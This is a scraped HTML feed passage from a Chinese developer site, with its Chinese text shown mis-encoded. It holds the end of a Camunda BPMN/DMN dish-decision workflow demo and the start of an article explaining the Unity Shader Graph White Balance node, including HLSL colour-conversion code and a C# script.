    <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_1rzb9vm"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Event_1i7sxll"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Activity_0fzwoab"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:userTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Activity_0fzwoab"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å°±é¤ä¿¡æ¯"</span> <span class="hljs-attr">camunda:assignee</span>=<span class="hljs-string">"${startUser}"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:extensionElements</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">camunda:formData</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">camunda:formField</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"temperature"</span> <span class="hljs-attr">label</span>=<span class="hljs-string">"æ°”æ¸©"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"long"</span> /&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">camunda:formField</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"dayType"</span> <span class="hljs-attr">label</span>=<span class="hljs-string">"æ—¥æœŸ"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"string"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">camunda:formData</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:extensionElements</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:incoming</span>&gt;</span>Flow_1rzb9vm<span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:outgoing</span>&gt;</span>Flow_0v0zyja<span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:userTask</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_0v0zyja"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Activity_0fzwoab"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Activity_08c0387"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:businessRuleTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Activity_08c0387"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å†³ç­–è§„åˆ™"</span> <span class="hljs-attr">camunda:resultVariable</span>=<span class="hljs-string">"desiredDish"</span> <span class="hljs-attr">camunda:decisionRef</span>=<span class="hljs-string">"dish-decision"</span> <span class="hljs-attr">camunda:mapDecisionResult</span>=<span class="hljs-string">"singleEntry"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:incoming</span>&gt;</span>Flow_0v0zyja<span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:outgoing</span>&gt;</span>Flow_1ajvk92<span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:businessRuleTask</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_1ajvk92"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Activity_08c0387"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Activity_0jobe9d"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:serviceTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Activity_0jobe9d"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å‡ºé¤ç¨‹åº"</span> <span class="hljs-attr">camunda:delegateExpression</span>=<span class="hljs-string">"${dishTask}"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:incoming</span>&gt;</span>Flow_1ajvk92<span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:incoming</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:outgoing</span>&gt;</span>Flow_0r2ykge<span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:outgoing</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:serviceTask</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:endEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Event_0x2ftot"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:incoming</span>&gt;</span>Flow_0r2ykge<span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:incoming</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:endEvent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bpmn:sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Flow_0r2ykge"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"Activity_0jobe9d"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"Event_0x2ftot"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:process</span>&gt;</span>
  
<span class="hljs-tag">&lt;/<span class="hljs-name">bpmn:definitions</span>&gt;</span>

</code></pre>
<ul>
<li>è¿è¡Œç»“æœ</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67b57d32b97c49bab66cb8ed12b30c82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5qyh5L2N6Z2i:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766464990&amp;x-signature=0Npis5NkpVMvANRwGD7kQ7tUMYo%3D" alt="dmn-demo.png" loading="lazy"/></p>
<pre><code class="hljs language-text" lang="text">è¿è¡Œç»“æœè§£é‡Šï¼š
ç”¨æˆ·è¾“å…¥çš„æ°”æ¸©15åº¦ï¼Œæ ¹æ®Season Dicisionå¯ä»¥å¾—åˆ°æ˜¯=Spring
ç”¨æˆ·è¾“å…¥çš„æ—¥æœŸç±»å‹weekday, æ ¹æ®Guest Countå¯ä»¥å¾—åˆ°å®¢äººæ•°é‡=4

æ ¹æ®season=spring, guestCount=4ï¼Œæ ¹æ®Dish Decisionå¯ä»¥å¾—åˆ°=stew 

å®Œå…¨ç¬¦åˆé¢„æœŸï¼
</code></pre>
<p>è®¿é—®<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ruoyiflow.com" target="_blank" title="https://www.ruoyiflow.com" ref="nofollow noopener noreferrer">è‹¥ä¾å·¥ä½œæµ</a>ç‚¹å‡»é¡¶éƒ¨ï¼Œæ¼”ç¤ºç³»ç»Ÿç«‹å³ä½“éªŒ!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€èŠ‚ç‚¹ã€‘[Adjustment-WhiteBalanceèŠ‚ç‚¹]åŸç†è§£æä¸å®é™…åº”ç”¨]]></title>    <link>https://juejin.cn/post/7583981974408380426</link>    <guid>https://juejin.cn/post/7583981974408380426</guid>    <pubDate>2025-12-16T03:02:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583981974408380426" data-draft-id="7583981974408364042" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€èŠ‚ç‚¹ã€‘[Adjustment-WhiteBalanceèŠ‚ç‚¹]åŸç†è§£æä¸å®é™…åº”ç”¨"/> <meta itemprop="keywords" content="æ¸¸æˆå¼€å‘,å›¾å½¢å­¦,Unity3D"/> <meta itemprop="datePublished" content="2025-12-16T03:02:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SmalBox"/> <meta itemprop="url" content="https://juejin.cn/user/2218166695237532"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€èŠ‚ç‚¹ã€‘[Adjustment-WhiteBalanceèŠ‚ç‚¹]åŸç†è§£æä¸å®é™…åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2218166695237532/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SmalBox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:02:55.000Z" title="Tue Dec 16 2025 03:02:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">ã€Unity Shader Graph ä½¿ç”¨ä¸ç‰¹æ•ˆå®ç°ã€‘</a><strong>ä¸“æ -ç›´è¾¾</strong></p>
</blockquote>
<p>åœ¨Unityçš„é€šç”¨æ¸²æŸ“ç®¡çº¿ï¼ˆURPï¼‰ä¸­ï¼ŒShader Graphä¸ºå¼€å‘è€…æä¾›äº†å¼ºå¤§çš„å¯è§†åŒ–ç€è‰²å™¨ç¼–è¾‘åŠŸèƒ½ã€‚White BalanceèŠ‚ç‚¹ä½œä¸ºè‰²å½©æ ¡æ­£çš„å…³é”®å·¥å…·ï¼Œé‡‡ç”¨ç§‘å­¦ç®—æ³•å®ç°ä¸“ä¸šçº§çš„ç™½å¹³è¡¡è°ƒèŠ‚ï¼Œå¹¿æ³›ç”¨äºæ¸¸æˆå¼€å‘ã€å½±è§†åæœŸåŠå®æ—¶æ¸²æŸ“ç­‰åœºæ™¯ã€‚æœ¬æ–‡åŸºäºå‰æœŸè®¨è®ºå†…å®¹ï¼Œè¿›ä¸€æ­¥æ‰©å±•å¹¶å®Œå–„è¯¥èŠ‚ç‚¹çš„æŠ€æœ¯ç»†èŠ‚ï¼Œå½¢æˆä½“ç³»åŒ–çš„æŠ€æœ¯æ–‡æ¡£ã€‚</p>
<p><img src="https://docs.unity.cn/cn/Packages-cn/com.unity.shadergraph@14.0/manual/images/WhiteBalanceNodeThumb.png" alt="" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>èŠ‚ç‚¹åŠŸèƒ½æ·±åº¦è§£æ</strong></h2>
<h3 data-id="heading-1"><strong>è‰²å½©è°ƒæ•´åŸç†</strong></h3>
<p>White BalanceèŠ‚ç‚¹åŸºäºCIE 1931è‰²å½©ç©ºé—´æ¨¡å‹ï¼Œæ¨¡æ‹Ÿäººçœ¼å¯¹å…‰æºè‰²æ¸©çš„æ„ŸçŸ¥æœºåˆ¶ï¼Œå®ç°è‰²å½©å‡†ç¡®æ ¡æ­£ã€‚å…¶æ ¸å¿ƒæµç¨‹æ˜¯å°†è¾“å…¥é¢œè‰²ä»çº¿æ€§RGBç©ºé—´è½¬æ¢è‡³LMSï¼ˆé•¿ã€ä¸­ã€çŸ­æ³¢é•¿ï¼‰è‰²å½©ç©ºé—´ï¼Œé€šè¿‡è°ƒèŠ‚ç™½å¹³è¡¡ç³»æ•°ï¼Œç²¾ç¡®æ§åˆ¶è‰²æ¸©ä¸è‰²è°ƒå˜åŒ–ã€‚</p>
<h3 data-id="heading-2"><strong>å‚æ•°å½±å“æœºåˆ¶</strong></h3>
<ul>
<li>â€Œ<strong>Temperatureå‚æ•°</strong>â€Œï¼šè°ƒèŠ‚è‰²æ¸©åç§»ï¼Œæ¨èèŒƒå›´ä¸ºÂ±1.67
<ul>
<li>è´Ÿå€¼ï¼šè‰²å½©åå‘æš–é»„ï¼ˆå¯¹åº”3000Kâ€“4500Kè‰²æ¸©ï¼‰</li>
<li>æ­£å€¼ï¼šè‰²å½©åå‘å†·è“ï¼ˆå¯¹åº”5500Kâ€“6500Kè‰²æ¸©ï¼‰</li>
</ul>
</li>
<li>â€Œ<strong>Tintå‚æ•°</strong>â€Œï¼šè°ƒèŠ‚è‰²è°ƒåç§»ï¼Œæ¨èèŒƒå›´ä¸ºÂ±1.67
<ul>
<li>æ­£å€¼ï¼šè‰²å½©å‘å“çº¢è‰²åç§»</li>
<li>è´Ÿå€¼ï¼šè‰²å½©å‘ç»¿è‰²åç§»</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3"><strong>æœ€ä½³å®è·µèŒƒå›´</strong></h3>

























<table><thead><tr><th>å‚æ•°ç±»å‹</th><th>æœ‰æ•ˆèŒƒå›´</th><th>è§†è§‰æ•ˆæœ</th></tr></thead><tbody><tr><td>Temperature</td><td>-1.67~1.67</td><td>è‡ªç„¶å¹³æ»‘çš„è‰²æ¸©è¿‡æ¸¡</td></tr><tr><td>Tint</td><td>-1.67~1.67</td><td>å¾®å¦™ä¸”å¯æ§çš„è‰²è°ƒå˜åŒ–</td></tr><tr><td>è¶…å‡ºèŒƒå›´</td><td>&gt;Â±1.67</td><td>å¯èƒ½å¯¼è‡´è‰²å½©å¤±çœŸæˆ–è¿‡é¥±å’Œ</td></tr></tbody></table>
<h2 data-id="heading-4"><strong>æ ¸å¿ƒç®—æ³•å®ç°</strong></h2>
<h3 data-id="heading-5"><strong>é¢„å¤„ç†é˜¶æ®µ</strong></h3>
<pre><code class="hljs language-c" lang="c">hlsl
<span class="hljs-comment">// å‚æ•°æ ‡å‡†åŒ–å¤„ç†</span>
<span class="hljs-type">float</span> t1 = Temperature * <span class="hljs-number">10</span> / <span class="hljs-number">6</span>;  <span class="hljs-comment">// æ¸©åº¦ç³»æ•°ç¼©æ”¾</span>
<span class="hljs-type">float</span> t2 = Tint * <span class="hljs-number">10</span> / <span class="hljs-number">6</span>;         <span class="hljs-comment">// è‰²è°ƒç³»æ•°ç¼©æ”¾</span>
</code></pre>
<h3 data-id="heading-6"><strong>CIEè‰²åº¦åæ ‡è®¡ç®—</strong></h3>
<p>åŸºäºD65æ ‡å‡†ç™½ç‚¹ï¼ˆ0.31271, 0.32902ï¼‰çš„è‰²åº¦åæ ‡è®¡ç®—ï¼š</p>
<pre><code class="hljs language-c" lang="c">hlsl
<span class="hljs-comment">// è®¡ç®—xåˆ†é‡</span>
<span class="hljs-type">float</span> x = <span class="hljs-number">0.31271</span> - t1 * (t1 &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0.1</span> : <span class="hljs-number">0.05</span>);

<span class="hljs-comment">// è®¡ç®—yåˆ†é‡</span>
<span class="hljs-type">float</span> standardIlluminantY = <span class="hljs-number">2.87</span> * x - <span class="hljs-number">3</span> * x * x - <span class="hljs-number">0.27509507</span>;
<span class="hljs-type">float</span> y = standardIlluminantY + t2 * <span class="hljs-number">0.05</span>;
</code></pre>
<h3 data-id="heading-7"><strong>XYZä¸‰åˆºæ¿€å€¼è½¬æ¢</strong></h3>
<pre><code class="hljs language-c" lang="c">hlsl
<span class="hljs-type">float</span> Y = <span class="hljs-number">1</span>;
<span class="hljs-type">float</span> X = Y * x / y;
<span class="hljs-type">float</span> Z = Y * (<span class="hljs-number">1</span> - x - y) / y;
</code></pre>
<h3 data-id="heading-8"><strong>LMSè‰²å½©ç©ºé—´è½¬æ¢</strong></h3>
<pre><code class="hljs language-c" lang="c">hlsl
<span class="hljs-comment">// è½¬æ¢çŸ©é˜µ</span>
float3x3 LIN_2_LMS_MAT = {
    { <span class="hljs-number">0.39045</span>, <span class="hljs-number">0.54994</span>, <span class="hljs-number">0.00893</span> },
    { <span class="hljs-number">0.07084</span>, <span class="hljs-number">0.96317</span>, <span class="hljs-number">0.01357</span> },
    { <span class="hljs-number">0.02308</span>, <span class="hljs-number">0.12802</span>, <span class="hljs-number">0.93645</span> }
};

float3x3 LMS_2_LIN_MAT = {
    { <span class="hljs-number">2.85847</span>, <span class="hljs-number">-1.62879</span>, <span class="hljs-number">-0.02489</span> },
    { <span class="hljs-number">-0.21018</span>, <span class="hljs-number">1.15820</span>, <span class="hljs-number">0.00032</span> },
    { <span class="hljs-number">-0.04181</span>, <span class="hljs-number">-0.11817</span>, <span class="hljs-number">1.06867</span> }
};

<span class="hljs-comment">// è½¬æ¢è¿‡ç¨‹</span>
float3 lms = mul(LIN_2_LMS_MAT, In);
float3 balance = float3(<span class="hljs-number">0.949237</span>, <span class="hljs-number">1.03542</span>, <span class="hljs-number">1.08728</span>) / lms;
lms *= balance;
Out = mul(LMS_2_LIN_MAT, lms);
</code></pre>
<h2 data-id="heading-9"><strong>é«˜çº§åº”ç”¨åœºæ™¯</strong></h2>
<h3 data-id="heading-10"><strong>åŠ¨æ€ç¯å¢ƒé€‚é…</strong></h3>
<p>é€šè¿‡è„šæœ¬æ§åˆ¶å®ç°åŠ¨æ€ç™½å¹³è¡¡è°ƒèŠ‚ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">csharp
<span class="hljs-comment">// C#ç¤ºä¾‹ï¼šæ ¹æ®æ—¶é—´è°ƒæ•´è‰²æ¸©</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">WhiteBalanceController</span> : <span class="hljs-title">MonoBehaviour</span>
{
    <span class="hljs-keyword">public</span> Material whiteBalanceMaterial;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">float</span> minTemperature = <span class="hljs-number">-1.5f</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">float</span> maxTemperature = <span class="hljs-number">1.5f</span>;

    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Update</span>()</span>
    {
        <span class="hljs-built_in">float</span> timeOfDay = Time.time % <span class="hljs-number">86400</span> / <span class="hljs-number">86400</span>;
        <span class="hljs-built_in">float</span> temperature = Mathf.Lerp(minTemperature, maxTemperature, timeOfDay);
        whiteBalanceMaterial.SetFloat(<span class="hljs-string">"_Temperature"</span>, temperature);
    }
}
</code></pre>
<h3 data-id="heading-11"><strong>å¤šé€šé“ç‹¬ç«‹æ§åˆ¶</strong></h3>
<p>é€šè¿‡åˆ†ç¦»é¢œè‰²é€šé“å®ç°ç‰¹æ®Šè§†è§‰æ•ˆæœï¼š</p>
<pre><code class="hljs language-c" lang="c">hlsl
<span class="hljs-comment">// HLSLç¤ºä¾‹ï¼šé€šé“ç‹¬ç«‹ç™½å¹³è¡¡</span>
float3 <span class="hljs-title function_">whiteBalanceChannels</span><span class="hljs-params">(float3 In, float3 Temperature, float3 Tint)</span>
{
    float3 w1 = float3(<span class="hljs-number">0.949237</span>, <span class="hljs-number">1.03542</span>, <span class="hljs-number">1.08728</span>);
    float3 w2 = float3(<span class="hljs-number">0.949237</span> + Temperature.x, <span class="hljs-number">1.03542</span> + Tint.y, <span class="hljs-number">1.08728</span> + Temperature.z);
    <span class="hljs-keyword">return</span> In * (w1 / w2);
}
</code></pre>
<h3 data-id="heading-12"><strong>æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆ</strong></h3>
<ul>
<li>é¢„è®¡ç®—ç™½å¹³è¡¡ç³»æ•°ï¼šä½¿ç”¨å¸¸æ•°èŠ‚ç‚¹æ›¿ä»£åŠ¨æ€è®¡ç®—ï¼Œå‡å°‘å®æ—¶è®¡ç®—å¼€é”€</li>
<li>ç®€åŒ–è½¬æ¢çŸ©é˜µï¼šé‡‡ç”¨è¿‘ä¼¼çŸ©é˜µæ›¿ä»£ç²¾ç¡®çŸ©é˜µï¼Œé™ä½è®¡ç®—å¤æ‚åº¦</li>
<li>åˆ†é€šé“å¤„ç†ï¼šå¯¹æ¯ä¸ªé¢œè‰²é€šé“åˆ†åˆ«å¤„ç†ï¼Œæé«˜å¹¶è¡Œå¤„ç†æ•ˆç‡</li>
</ul>
<h2 data-id="heading-13"><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></h2>
<h3 data-id="heading-14"><strong>è‰²å½©å¤±çœŸé—®é¢˜</strong></h3>
<p>â€Œ<strong>ç°è±¡</strong>â€Œï¼šå‚æ•°è°ƒæ•´åå‡ºç°ä¸è‡ªç„¶çš„è‰²å½©åç§»</p>
<p>â€Œ<strong>è§£å†³æ–¹æ¡ˆ</strong>â€Œï¼š</p>
<ul>
<li>ç¡®è®¤å‚æ•°æœªè¶…å‡ºæœ‰æ•ˆèŒƒå›´ï¼ˆÂ±1.67ï¼‰</li>
<li>ç»“åˆColor GradeèŠ‚ç‚¹è¿›è¡Œåç»­å¾®è°ƒ</li>
<li>ç¡®ä¿è¾“å…¥é¢œè‰²å¤„äºæ­£ç¡®çš„è‰²å½©ç©ºé—´ï¼ˆå¦‚çº¿æ€§ç©ºé—´ï¼‰</li>
</ul>
<h3 data-id="heading-15"><strong>æ€§èƒ½ç“¶é¢ˆé—®é¢˜</strong></h3>
<p>â€Œ<strong>ç°è±¡</strong>â€Œï¼šä½¿ç”¨ç™½å¹³è¡¡èŠ‚ç‚¹åå¸§ç‡æ˜¾è‘—ä¸‹é™</p>
<p>â€Œ<strong>è§£å†³æ–¹æ¡ˆ</strong>â€Œï¼š</p>
<ul>
<li>åœ¨ç§»åŠ¨å¹³å°é‡‡ç”¨ç®€åŒ–ç‰ˆç™½å¹³è¡¡ç®—æ³•</li>
<li>å°†ç™½å¹³è¡¡è®¡ç®—ç§»è‡³é¡¶ç‚¹ç€è‰²å™¨</li>
<li>ä½¿ç”¨LUTï¼ˆæŸ¥æ‰¾è¡¨ï¼‰æ›¿ä»£å®æ—¶è®¡ç®—</li>
</ul>
<h3 data-id="heading-16"><strong>ä¸å…¶ä»–æ•ˆæœå†²çª</strong></h3>
<p>â€Œ<strong>ç°è±¡</strong>â€Œï¼šç™½å¹³è¡¡ä¸å…¶ä»–åæœŸå¤„ç†æ•ˆæœå åŠ åå‡ºç°å¼‚å¸¸</p>
<p>â€Œ<strong>è§£å†³æ–¹æ¡ˆ</strong>â€Œï¼š</p>
<ul>
<li>è°ƒæ•´æ•ˆæœåº”ç”¨é¡ºåºï¼ˆç™½å¹³è¡¡é€šå¸¸åº”ä¼˜å…ˆå¤„ç†ï¼‰</li>
<li>é€šè¿‡æ··åˆæ¨¡å¼æ§åˆ¶å„æ•ˆæœå¼ºåº¦</li>
<li>åˆ†å±‚å¤„ç†ä¸åŒè‰²å½©è°ƒèŠ‚æ­¥éª¤</li>
</ul>
<h2 data-id="heading-17"><strong>æœ€ä½³å®è·µæŒ‡å—</strong></h2>
<h3 data-id="heading-18"><strong>å·¥ä½œæµç¨‹å»ºè®®</strong></h3>
<ul>
<li>é¡¹ç›®åˆæœŸç¡®ç«‹è‰²å½©å‚è€ƒæ ‡å‡†</li>
<li>ä½¿ç”¨Color CheckerèŠ‚ç‚¹è¿›è¡Œè‰²å½©æ ¡å‡†</li>
<li>å°†ç™½å¹³è¡¡å‚æ•°ä¸å…‰ç…§ç³»ç»Ÿå…³è”</li>
</ul>
<h3 data-id="heading-19"><strong>ç§»åŠ¨å¹³å°é€‚é…</strong></h3>
<ul>
<li>é‡‡ç”¨ä½ç²¾åº¦æµ®ç‚¹è®¡ç®—ï¼ˆå¦‚halfï¼‰</li>
